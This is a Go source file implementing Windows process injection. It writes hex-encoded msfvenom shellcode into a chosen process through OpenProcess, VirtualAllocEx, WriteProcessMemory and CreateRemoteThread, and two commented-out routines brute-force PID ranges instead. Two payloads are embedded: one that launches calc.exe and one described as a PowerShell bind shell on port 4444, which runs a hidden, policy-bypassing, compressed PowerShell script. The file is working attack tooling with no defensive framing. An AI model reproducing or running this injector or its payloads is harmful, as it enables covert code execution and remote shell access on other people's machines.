// GOOS=windows GOARCH=amd64 go build win_process_inject.go
// Use extreme caution, often crashes target processes
package main

import (
  "encoding/hex"
  "os"
  "syscall"
  "unsafe"
  "fmt"
  "time"
  "strconv"
)

// example Cmd running calc
// msfvenom --format hex -p windows/x64/exec CMD="cmd /c calc.exe"
const (
    bind_shell64 = "fc4883e4f0e8c0000000415141505251564831d265488b5260488b5218488b5220488b7250480fb74a4a4d31c94831c0ac3c617c022c2041c1c90d4101c1e2ed524151488b52208b423c4801d08b80880000004885c074674801d0508b4818448b40204901d0e35648ffc9418b34884801d64d31c94831c0ac41c1c90d4101c138e075f14c034c24084539d175d858448b40244901d066418b0c48448b401c4901d0418b04884801d0415841585e595a41584159415a4883ec204152ffe05841595a488b12e957ffffff5d48ba0100000000000000488d8d0101000041ba318b6f87ffd5bbf0b5a25641baa695bd9dffd54883c4283c067c0a80fbe07505bb4713726f6a00594189daffd5636d64202f632063616c632e65786500"
)

// PowerShell BindShell on port 4444
// msfvenom --format python -p windows/x64/powershell_bind_tcp
const (
  bind_shell64_ps = "fc4883e4f0e8c0000000415141505251564831d265488b5260488b5218488b5220488b7250480fb74a4a4d31c94831c0ac3c617c022c2041c1c90d4101c1e2ed524151488b52208b423c4801d08b80880000004885c074674801d0508b4818448b40204901d0e35648ffc9418b34884801d64d31c94831c0ac41c1c90d4101c138e075f14c034c24084539d175d858448b40244901d066418b0c48448b401c4901d0418b04884801d0415841585e595a41584159415a4883ec204152ffe05841595a488b12e957ffffff5d48ba0100000000000000488d8d0101000041ba318b6f87ffd5bbf0b5a25641baa695bd9dffd54883c4283c067c0a80fbe07505bb4713726f6a00594189daffd5706f7765727368656c6c2e657865202d6578656320627970617373202d6e6f70202d572068696464656e202d6e6f6e696e7465726163746976652049455820242824733d4e65772d4f626a65637420494f2e4d656d6f727953747265616d282c5b436f6e766572745d3a3a46726f6d426173653634537472696e67282748347349414d626636566b4341353157323237624f4242393931634d58473074495462684274755841436b3256644c6441476c72564e374e673245677444534f745a464a4c306e356773542f766b4f4a756a684f304d3371785259355048506d7a49563642794f355154585042517a67567158476f49445a446a37547a7a6858416857386830752b5276694471325458365a426c62464970344863306731756378566d4b776b446e73515030654a73597a754562626762665a33396a6247417733713377473138694c527047396d466858786d7a507a566534707a6e6d516b564a725354386b7754684764556a725856534d6e746a6a327a6f505857536d5862325463555631566f6e55636f396b6463386156662f703945527158696675714663726e6b49756b66726b593669365634746e67704e794b5450436c57413465705a49786167784e674b5a4d38513076774e7a2b413069536467312b356751482b4139315a4b704a75554779573534717a5761704a66704c386e467a7536502b535764556947542b67305777637232366378665258656f34504d6d32344d74617638317a7375685364742b7775346868586867444c6450676c6c6631726442577555576b385a6c784474314c2b45764e77354278317533314c33666e726c4a70706f3541764c6345536a314674526355614557736f6c536b7047646e79364c6f4d7450686f6e555556324375554d4d36707a486373716b783935372f767a616d4f734f382f656d4e4333384f41613567636e506d4253326b77524758536552707a67332f784c4532344c6261515a396d4d78772f5449486942447276497a634a57716a31306f577378676c6161476857614b4e6f795457593767355070314c4f2f747343476a4a304f36586e363558473464307169534b707466324a776178694b5743613265732f4f4c714c772b6a7177366e36324e6e37336c737051626e5135413649465a686d6f58416979426f6f393131534b58546742443858367a4c344a3238676e74455a707144646975567a6c70746d384536466337565236767a446768774763446a3938684b3970724b535763774f68564375704373305958466950316c4b44516e4b77786f5464695476684b7331707775786751722b4a726a2f734e792f73427357395762517270657254647130636c637262704a7163544f4747494b30327273645a7a665074584b745458365336347647434f4a65676b497036686a5257445733372b41656a4e324256744f575571704343703275786c673834754e71755346744e6574636f2b38503265354d53765645455063707a77654a47786b556d417a62695a6b477276552b392f3532367a534c4e30506539744f69423876675035496c66566e7766686e3377447334464d42414977365063586c6e366d4977706c4e6575497a635372416b72517278794954636f314e6a63556d6d6875636c557946794641313461504373726d674e5779364d45774b41617179583436616633482b414a7675646d554b4b436b2b49413668514b5153706745766b6e4b59426541374b31524478555371724a63487267724d573632476478686c7a357755734d7a74737631506a627a6e456e2f6166796157422b326a7274556a6c716e4f724d6c797a58692f716d6457505158534e684a6a5736654a71374c7a4a7956563134394c58517162385336755459322f6c663659556743786b4a4141413d2729293b49455820284e65772d4f626a65637420494f2e53747265616d526561646572284e65772d4f626a65637420494f2e436f6d7072657373696f6e2e477a697053747265616d2824732c5b494f2e436f6d7072657373696f6e2e436f6d7072657373696f6e4d6f64655d3a3a4465636f6d70726573732929292e52656164546f456e6428293b2900"
)

func main() {

  //FirstPIDInject(bind_shell64)
  //fmt.Println("Injected into first pid!")
  //time.Sleep(1000*time.Duration(10)*time.Millisecond)
  //HigherPIDInject(bind_shell64_ps)
  //fmt.Println("Injected into high pid")
  //time.Sleep(1000*time.Duration(10)*time.Millisecond)
  argPid := os.Args[1]
  var argi1 int
  argi1, err := strconv.Atoi(argPid)
  if err != nil {
    panic(err)
  }
  SpecificPIDInject(bind_shell64, argi1)
  fmt.Printf("Injected into %d pid\n", argi1)
  time.Sleep(1000*time.Duration(20)*time.Millisecond)

}

const (
	winMemCommit        = 0x1000
	winMemReserve       = 0x2000
	winAllocMemAsRW     = 0x40
	winProcCreateThread = 0x0002
	winProcQueryInfo    = 0x0400
	winProcMemOp        = 0x0008
	winProcMemWrite     = 0x0020
	winProcMemRead      = 0x0010
	zeroValue           = 0
)

var (
	k32                   = syscall.NewLazyDLL("kernel32.dll")
	virtualAlloc          = k32.NewProc("VirtualAlloc")
	winOpenProc           = k32.NewProc("OpenProcess")
	winWriteProcMem       = k32.NewProc("WriteProcessMemory")
	winMemAllocEx         = k32.NewProc("VirtualAllocEx")
	winCreateRemoteThread = k32.NewProc("CreateRemoteThread")
)

func allocate(shellcode uintptr) uintptr {
	addr, _, _ := virtualAlloc.Call(0, shellcode, winMemReserve|winMemCommit, winAllocMemAsRW)
	if addr == 0 {
		os.Exit(0)
	}
	return addr
}

func FirstPIDInject(code string) {
	shellcode, err := hex.DecodeString(code)
	if err != nil {
		return
	}

	shellcodeAddr := allocate(uintptr(len(shellcode)))
	AddrPtr := (*[990000]byte)(unsafe.Pointer(shellcodeAddr))
	for shellcodeIdx, shellcodeByte := range shellcode {
		AddrPtr[shellcodeIdx] = shellcodeByte
	}

	for i := 100; i < 99999; i++ {
		remoteProcess, _, _ := winOpenProc.Call(winProcCreateThread|winProcQueryInfo|winProcMemOp|winProcMemWrite|winProcMemRead, uintptr(zeroValue), uintptr(i))
		remoteProcessMem, _, _ := winMemAllocEx.Call(remoteProcess, uintptr(zeroValue), uintptr(len(shellcode)), winMemReserve|winMemCommit, winAllocMemAsRW)
		winWriteProcMem.Call(remoteProcess, remoteProcessMem, shellcodeAddr, uintptr(len(shellcode)), uintptr(zeroValue))
		status, _, _ := winCreateRemoteThread.Call(remoteProcess, uintptr(zeroValue), 0, remoteProcessMem, uintptr(zeroValue), 0, uintptr(zeroValue))
		if status != 0 {
			break
		}
	}
}

func HigherPIDInject(code string) {
	shellcode, err := hex.DecodeString(code)
	if err != nil {
		return
	}

	shellcodeAddr := allocate(uintptr(len(shellcode)))
	AddrPtr := (*[990000]byte)(unsafe.Pointer(shellcodeAddr))
	for shellcodeIdx, shellcodeByte := range shellcode {
		AddrPtr[shellcodeIdx] = shellcodeByte
	}

	for i := 4000; i < 99999; i++ {
		remoteProcess, _, _ := winOpenProc.Call(winProcCreateThread|winProcQueryInfo|winProcMemOp|winProcMemWrite|winProcMemRead, uintptr(zeroValue), uintptr(i))
		remoteProcessMem, _, _ := winMemAllocEx.Call(remoteProcess, uintptr(zeroValue), uintptr(len(shellcode)), winMemReserve|winMemCommit, winAllocMemAsRW)
		winWriteProcMem.Call(remoteProcess, remoteProcessMem, shellcodeAddr, uintptr(len(shellcode)), uintptr(zeroValue))
		status, _, _ := winCreateRemoteThread.Call(remoteProcess, uintptr(zeroValue), 0, remoteProcessMem, uintptr(zeroValue), 0, uintptr(zeroValue))
		if status != 0 {
			break
		}
	}
}

func SpecificPIDInject(code string, pid2 int) {
	shellcode, err := hex.DecodeString(code)
	if err != nil {
		return
	}

	shellcodeAddr := allocate(uintptr(len(shellcode)))
	AddrPtr := (*[990000]byte)(unsafe.Pointer(shellcodeAddr))
	for shellcodeIdx, shellcodeByte := range shellcode {
		AddrPtr[shellcodeIdx] = shellcodeByte
	}

	remoteProcess, _, _ := winOpenProc.Call(winProcCreateThread|winProcQueryInfo|winProcMemOp|winProcMemWrite|winProcMemRead, uintptr(zeroValue), uintptr(pid2))
	remoteProcessMem, _, _ := winMemAllocEx.Call(remoteProcess, uintptr(zeroValue), uintptr(len(shellcode)), winMemReserve|winMemCommit, winAllocMemAsRW)
	winWriteProcMem.Call(remoteProcess, remoteProcessMem, shellcodeAddr, uintptr(len(shellcode)), uintptr(zeroValue))
	status, _, _ := winCreateRemoteThread.Call(remoteProcess, uintptr(zeroValue), 0, remoteProcessMem, uintptr(zeroValue), 0, uintptr(zeroValue))
  fmt.Println(status)
}
